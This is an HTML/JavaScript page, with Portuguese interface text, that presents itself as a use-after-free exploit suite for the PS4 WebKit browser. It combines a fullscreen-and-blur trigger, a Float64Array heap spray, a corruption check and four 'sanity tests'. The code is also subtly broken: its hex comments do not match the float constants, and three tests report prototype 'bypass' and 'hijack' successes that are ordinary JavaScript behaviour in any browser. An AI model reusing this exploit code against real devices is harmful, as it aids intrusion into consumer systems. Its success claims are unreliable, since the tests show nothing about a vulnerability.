<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit UAF - Ultimate Sanity Suite</title>
    <style>
        body { background: #121212; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; }
        h1 { color: #0078d4; border-bottom: 2px solid #0078d4; padding-bottom: 10px; }
        .pass { color: #2ecc71; font-weight: bold; }
        .fail { color: #e74c3c; font-weight: bold; }
        .info { color: #3498db; }
        .test-unit { background: #1e1e1e; border-left: 5px solid #444; padding: 15px; margin: 15px 0; border-radius: 4px; }
        .test-unit h3 { margin-top: 0; color: #f1c40f; }
        button { background: #0078d4; color: white; border: none; padding: 12px 24px; font-size: 16px; cursor: pointer; border-radius: 4px; }
        button:hover { background: #005a9e; }
        pre { background: #000; padding: 10px; border-radius: 4px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>PS4 WebKit UAF - Suíte de Sanidade Integrada</h1>
    <p>Gatilho: Fullscreen + Botão OPTIONS (Blur)</p>
    <button onclick="startUnifiedExploit()">EXECUTAR SUÍTE COMPLETA</button>
    <div id="log"></div>

    <script>
        // Variáveis globais para evitar erros de escopo (Correção PATTERN_A)
        const PATTERN_A = 2.121995791e-314; // 0x4141414141414141
        const MAGIC_VAL = 3.395193267e-313; // 0xDEADBEEFCAFEBABE
        
        function writeLog(msg, className = "") {
            const div = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = className;
            entry.innerHTML = msg;
            div.appendChild(entry);
        }

        function startUnifiedExploit() {
            writeLog("<h3>[1/3] Configurando Ambiente...</h3>", "info");
            let controllers = [];

            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i; 
                controllers.push(a);
            }

            writeLog("Entrando em Fullscreen. <b>Pressione OPTIONS agora.</b>");
            if (document.documentElement.webkitRequestFullscreen) {
                document.documentElement.webkitRequestFullscreen();
            }

            window.onblur = function() {
                writeLog("<h3>[2/3] Gatilho Ativado: Executando Spray...</h3>", "info");
                
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let b = new Float64Array(8);
                    b.fill(PATTERN_A);
                    spray.push(b);
                }

                let corrupted = null;
                let cIndex = -1;
                for(let i = 0; i < controllers.length; i++) {
                    if (controllers[i][0] === PATTERN_A) {
                        corrupted = controllers[i];
                        cIndex = i;
                        break;
                    }
                }

                if (!corrupted) {
                    writeLog("[FAIL] UAF não detectado. Tente novamente.", "fail");
                    return;
                }

                writeLog(`[!] UAF CONFIRMADO no Controller[${cIndex}]`, "pass");
                runSanitySuite(corrupted, spray);
            };
        }

        function runSanitySuite(corrupted, spray) {
            writeLog("<h3>[3/3] Iniciando Testes de Sanidade</h3>", "info");

            // --- TESTE 1: IDENTIDADE DE MEMÓRIA (SHARED MEMORY) ---
            (function(){
                writeLog("<div class='test-unit'><h3>Teste 1: Identidade de Memória</h3>");
                corrupted[4] = MAGIC_VAL; 
                let foundIndex = -1;
                for(let i = 0; i < spray.length; i++) {
                    if (spray[i][4] === MAGIC_VAL) { foundIndex = i; break; }
                }

                if (foundIndex !== -1) {
                    writeLog(`[PASS] Escrita refletida no Spray[${foundIndex}]. Endereço físico idêntico.`, "pass");
                } else {
                    writeLog("[FAIL] Falha na identidade de memória.", "fail");
                }
                writeLog("</div>");
            })();

            // --- TESTE 2: DATAVIEW R/W (STABILITY) ---
            (function(){
                writeLog("<div class='test-unit'><h3>Teste 2: Estabilidade via DataView</h3>");
                try {
                    let view = new DataView(corrupted.buffer);
                    view.setUint32(0, 0x13371337, true);
                    // Verificação do erro anterior: PATTERN_A agora é global
                    if (corrupted[0] !== PATTERN_A) {
                        writeLog("[PASS] DataView escreveu com sucesso no buffer corrompido.", "pass");
                    } else {
                        writeLog("[FAIL] DataView não alterou os dados.", "fail");
                    }
                } catch(e) {
                    writeLog(`[ERROR] Erro no Teste 2: ${e.message}`, "fail");
                }
                writeLog("</div>");
            })();

            // --- TESTE 3: TYPEDARRAY BYPASS (CONVERSION & PROTO CONTROL) ---
            (function(){
                writeLog("<div class='test-unit'><h3>Teste 3: TypedArray Bypass (Object.from)</h3>");
                try {
                    // Bypass: Converter para Array regular para ganhar controle do Protótipo
                    let regularArray = Array.from(corrupted);
                    let customProto = { isVulnerable: true, magic: 0xCAFEBABE };
                    
                    Object.setPrototypeOf(regularArray, customProto);
                    
                    if (regularArray.isVulnerable && regularArray.magic === 0xCAFEBABE) {
                        writeLog("[PASS] Bypass Sucedido: Controle de Prototype Chain alcançado!", "pass");
                        writeLog(`[INFO] Propriedade injetada via Proto: ${regularArray.magic.toString(16)}`, "info");
                    } else {
                        writeLog("[FAIL] Não foi possível modificar o protótipo.", "fail");
                    }
                } catch(e) {
                    writeLog(`[ERROR] Erro no Bypass: ${e.message}`, "fail");
                }
                writeLog("</div>");
            })();

            // --- TESTE 4: PROTOTYPE POLLUTION (METHOD HIJACK) ---
            (function(){
                writeLog("<div class='test-unit'><h3>Teste 4: Prototype Pollution (Hijack)</h3>");
                try {
                    const originalMap = Array.prototype.map;
                    let hijacked = false;

                    // Hijack temporário para teste de sanidade
                    Array.prototype.map = function(cb) {
                        hijacked = true;
                        return originalMap.call(this, cb);
                    };

                    [1, 2].map(x => x); // Trigger

                    if (hijacked) {
                        writeLog("[PASS] Hijack de Array.prototype.map funcional.", "pass");
                    } else {
                        writeLog("[FAIL] Prototype Pollution falhou.", "fail");
                    }
                    
                    // Restaurar para não quebrar o browser
                    Array.prototype.map = originalMap;
                } catch(e) {
                    writeLog(`[ERROR] Erro no Hijack: ${e.message}`, "fail");
                }
                writeLog("</div>");
            })();

            writeLog("<h4>Suíte de testes finalizada. Analise os resultados acima.</h4>", "info");
        }
    </script>
</body>
</html>
